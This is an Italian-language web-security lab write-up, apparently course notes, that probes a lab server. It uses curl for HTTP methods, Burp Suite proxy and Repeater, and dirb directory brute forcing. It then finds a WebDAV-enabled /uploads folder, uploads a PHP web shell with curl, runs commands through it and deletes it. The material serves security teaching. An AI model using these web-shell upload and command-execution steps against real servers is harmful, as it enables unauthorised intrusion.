# HTTP Basics Lab - Part 2

## Curl

Per scaricare pagine web e file via HTTP dal ter,omaòe.

```
curl -v http://192.191.151.3/
```

<figure><img src="../../../.gitbook/assets/image (1758).png" alt=""><figcaption></figcaption></figure>

Possiamo vedere la chiamata HTTP, la risposta HTTP con headers e contenuto.

In questo caso l'header X-Powered-By nella risposta viene specificato che linguaggio viene usato per il backend (PHP) e anche il fatto che è su ubuntu.

<figure><img src="../../../.gitbook/assets/image (1759).png" alt=""><figcaption></figcaption></figure>

### Specificare metodo HTTP HEAD

```
curl -v -I http://192.191.151.3/
```

<figure><img src="../../../.gitbook/assets/image (1760).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1761).png" alt=""><figcaption></figcaption></figure>

### Metodi supportati dal target con HTTP OPTIONS

```
curl -v -X OPTIONS http://192.191.151.3/
```

<figure><img src="../../../.gitbook/assets/image (1762).png" alt=""><figcaption></figcaption></figure>

### Risposta 405 per metodo non supportato (es. PUT)

```
curl -v -X PUT http://192.191.151.3/
```

<figure><img src="../../../.gitbook/assets/image (1763).png" alt=""><figcaption></figcaption></figure>

Oltre alla risposta con codice 405 c'è anche un codice HTML di una pagina di errore, che non sempre è previsto.

## Burp Suite

Aprire Firefox e attivare il profilo Burp Suite nell'add-on di FoxyProxy.

<figure><img src="../../../.gitbook/assets/image (1764).png" alt=""><figcaption></figcaption></figure>

In questo modo fa da proxy intercettando tute le richieste e risposte. E le possiamo vedere in Burp Suite.

Apriamo BurpSuite andando sul menù Start -> 03 - Web Application Analysis -> burpsuite.

<figure><img src="../../../.gitbook/assets/image (1765).png" alt=""><figcaption></figcaption></figure>

### Proxy

Andiamo sul tab Proxy e assicuriamoci che "Intercept is on".

Andiamo sulla pagina web e facciamo una richiesta (refresh ad esempio) e vediamo che la richiesta viene intercettata:

<figure><img src="../../../.gitbook/assets/image (1766).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1768).png" alt=""><figcaption></figcaption></figure>

Se facciamo Forward la richiesta viene inoltrata e la risposta caricata dal browser:

<figure><img src="../../../.gitbook/assets/image (1767).png" alt=""><figcaption></figcaption></figure>

Possiamo modificare gli header della richiesta come vogliamo.

<figure><img src="../../../.gitbook/assets/image (1769).png" alt=""><figcaption></figcaption></figure>

Nel tab Proxy -> HTTP History (Tab) possiamo vedere tutte le richieste e risposte passate:

<figure><img src="../../../.gitbook/assets/image (1770).png" alt=""><figcaption></figcaption></figure>

### Repeater

Se nel Proxy -> Intercept facciamo click con il tasto destro e selezioniamo "Send to Repeater" possiamo vedere la nostra richiesta nel tab Repeater. Qui è possibile ripetere le richeiste inserendo anche dei parametri, e visualizzare la risposta:

<figure><img src="../../../.gitbook/assets/image (1771).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1772).png" alt=""><figcaption></figcaption></figure>

#### Usare repeater per brute force login

Andiamo sulla pagina /login.php dal browser, e inseriamo due credenziali di test e inviamo la richiesta intercettata al repeater.

<figure><img src="../../../.gitbook/assets/image (1773).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1774).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1775).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1776).png" alt=""><figcaption></figcaption></figure>



## Directory bruteforce

```
dirb http://192.191.151.3/
```

<figure><img src="../../../.gitbook/assets/image (1777).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1778).png" alt=""><figcaption></figcaption></figure>

Le risposte 200 sono pagine che vengono correttamente visualizzate.

Abbiamo trovato la cartella /uploads, proviamo a visualizzarla

### Cartella /uploads

<figure><img src="../../../.gitbook/assets/image (1780).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1779).png" alt=""><figcaption></figcaption></figure>

Controlliamo ora i metodi supportati da questa cartella, vediamo se c'è PUT così che possiamo caricare qualche file malevolo, magari un eseguibile di una shell.

Se modifichiamo nel Repeater di Burp Suite la richiesta in OPTIONS /uploads/ HTTP/1.1 vediamo che la risposta ora ci dà l'elenco dei metodi supportati, e tra questi metodi (Allow) ce ne sono svariati che sembrano interessanti: DELETE, COPY, POST. Ma non abbiamo PUT. Però negli altri header notiamo DAV, che quinci ci suggerisce che possiamo usare webdav per caricare dei file o in generale navigare le cartelle.

<figure><img src="../../../.gitbook/assets/image (1781).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1782).png" alt=""><figcaption></figcaption></figure>

## Upload con curl di una webshell PHP

```
curl http://192.191.151.3/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php
```

<figure><img src="../../../.gitbook/assets/image (1783).png" alt=""><figcaption></figcaption></figure>

Ora se ricarichiamo la pagina vediamo che il file php è stato caricato. Se ci clicchiamo sopra ci spiega come usarla.

<figure><img src="../../../.gitbook/assets/image (1784).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1785).png" alt=""><figcaption></figcaption></figure>

E possiamo quindi eseguire comandi inserendoli nella url come parametro ?url= e inserendo + al posto degli spazi.

<figure><img src="../../../.gitbook/assets/image (1786).png" alt=""><figcaption></figcaption></figure>

Siccome dovremmo usare l'encoding se ci sono simboli, possiamo inviare al repeater la richiesta e inserire i comandi lì, così l'encoding ce lo fa burp suite in automatico.

<figure><img src="../../../.gitbook/assets/image (1787).png" alt=""><figcaption></figcaption></figure>

Nel caso sopra c'era un errore, mettiamo + al posto dell'encoding dello spazio.

<figure><img src="../../../.gitbook/assets/image (1788).png" alt=""><figcaption></figcaption></figure>

## Cancellare una risorsa con DELETE

Usiamo il repeater cambiando la richiesta in DELETE uploads/simple-backdoor.php HTTP/1.1

Risposta 204 No Content. Se ricarichiamo la pagina in cui era presente il file ora ci restituisce 404, quindi è stata cancellata correttamente.

<figure><img src="../../../.gitbook/assets/image (1789).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1790).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1791).png" alt=""><figcaption></figcaption></figure>
